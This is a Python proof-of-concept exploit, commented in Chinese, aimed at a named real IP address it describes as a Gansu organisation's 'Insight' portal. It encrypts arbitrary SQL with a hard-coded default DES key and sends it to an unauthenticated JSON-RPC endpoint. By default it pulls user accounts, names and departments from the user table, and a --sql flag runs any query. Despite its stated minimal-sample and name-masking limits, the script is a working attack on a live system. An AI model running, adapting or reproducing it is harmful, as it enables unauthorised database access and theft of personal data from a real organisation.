#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
POC: 甘肃某单位 117.157.75.196:9090 Insight 办事大厅 匿名未授权任意SQL执行 —— 真实数据回显
靶: https://117.157.75.196:9090/rpc?p=/insight/v2/portal/preSqlAndRunCiSqlToCi
算法: DES-ECB / Pkcs7, 硬编码默认密钥 insighti (前端 js sym='insighti')
用法:
  python poc_sql_leak.py                # 读 platform.sec_user 前5行真实账号/姓名/部门(脱敏展示)
  python poc_sql_leak.py --sql "select version()"
最小样本: 默认仅读 account/display_name/department 前 5 行, 姓名脱敏, 不读手机号/邮箱/密码,
          不拖全库, 不改删数据。(医疗/单位资产无害化边界)
"""
import argparse, base64, sys
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad
import requests, urllib3
urllib3.disable_warnings()

TARGET = "https://117.157.75.196:9090"
METHOD = "/insight/v2/portal/preSqlAndRunCiSqlToCi"
UUID = "37ea4a70-af77-4c1a-9422-7582afc0de41"   # 任意 UUID, 接口不校验
KEY = b"insighti"

def enc_sql(sql: str) -> str:
    eng = DES.new(KEY, DES.MODE_ECB)
    return base64.b64encode(eng.encrypt(pad(sql.encode(), 8))).decode()

def run(sql: str):
    cipher = enc_sql(sql)
    body = {
        "jsonrpc": "2.0", "method": METHOD, "id": 1,
        "params": [UUID, {}, cipher, []],
    }
    r = requests.post(f"{TARGET}/rpc?p={METHOD}", json=body,
                      headers={"Accept": "application/json"},
                      verify=False, timeout=20)
    print(f"[HTTP {r.status_code}] sql={sql!r}  cipher={cipher}")
    try:
        resp = r.json()
    except Exception:
        print("非JSON响应:", r.text[:500]); return
    rows = resp.get("result", [])
    # 脱敏: 中文姓名仅留首字(张*), 工号/数字维持真实以作泄露证据, GUID/长串部门截断
    import unicodedata as _u
    def mask(v):
        if not isinstance(v, str) or not v:
            return v
        if v[0].isdigit() and len(v) <= 8:      # 工号/账号: 保留真实作证据
            return v
        if _u.category(v[0]).startswith("Lo"):  # 汉字姓名 → 张*
            return v[0] + "*" * (len(v) - 1)
        return (v[:6] + "…") if len(v) > 12 else v
    print(f"=> 返回 {len(rows)} 行:")
    for row in rows[:10]:
        if isinstance(row, dict):
            print("   ", {k: mask(v) for k, v in row.items()})
        else:
            print("   ", mask(row))

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--sql", default="select account, display_name, department from platform.sec_user limit 5")
    a = ap.parse_args()
    run(a.sql)